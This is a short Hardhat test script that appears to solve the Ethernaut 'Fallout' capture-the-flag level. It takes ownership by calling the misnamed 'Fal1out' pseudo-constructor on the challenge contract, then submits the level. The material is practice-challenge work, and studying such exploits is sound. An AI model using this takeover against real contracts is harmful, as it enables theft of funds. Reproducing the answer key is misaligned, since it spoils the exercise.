import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Fallout`);
    const challengeAddress = await createChallenge(
        `0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    let tx = await challenge.Fal1out({});
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
